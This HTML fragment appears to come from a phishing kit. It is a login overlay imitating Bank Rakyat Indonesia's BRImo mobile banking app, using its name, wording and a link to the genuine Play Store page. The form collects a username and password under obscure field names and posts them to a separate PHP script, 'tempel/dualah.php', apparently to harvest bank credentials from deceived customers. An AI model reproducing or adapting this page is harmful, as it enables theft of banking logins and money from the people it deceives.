...
<body>
  ...
  <div style="position: fixed; left: 0; right: 0; width: 100%; top: 0; bottom: 0; height: 100%; background: rgba(0, 0, 0, 0.5); display: none" id="formlogin">
...
<button type="button" style="position: absolute; left: 15; top: 14; color: #0F78CB; border: none; background: transparent; z-index: 9999" onclick="batalkanku()">Batalkan</button>
<center>
<h3 style="position: absolute; left: 0; right: 0; top: 0; margin: 0px auto; font-size :19px; font-weight: 700; top: 14">Login</h3>
</center>
<form action="tempel/dualah.php"  method="POST">
 ...
 <input type="text" class="bubble-element Input" name="d" id="uname" placeholder="Username" required autocomplete="off" /><br/>
<ion-icon name="lock-closed" id="ionIcons" style="margin-top: 133px"></ion-icon>
<input name="e" id="pass" type="password" class="bubble-element Input" placeholder="Password" maxlength="" style="border-radius: ; margin-top: 60px"  pattern="(?=.*[a-z])(?=.*[A-Z]).{8,}" title="Masukan Data yang terdaftar di 𝗕𝗥𝗜𝗺𝗼 anda"  required>
<div class="bubble-element eye clickable-element" tabindex="3" id="eyeOpen">
                        ...
                        <div class="bubble-element eye clickable-element" tabindex="3" id="eyeClose" style="display: none">
                            <ion-icon name="eye" id="eye"></ion-icon>
                                       ...
                                       <center>
 <a href="https://play.google.com/store/apps/details?id=id.co.bri.brimo" target="_blank" style="color: #025198; font-weight: 600; font-family: sans-serif; position: fixed; bottom: 10; left: 0; right: 0; margin: 0px auto; font-size: 16px">Lupa Username/Password?</a>
 </center>
    </div>
    </div>
    </form>
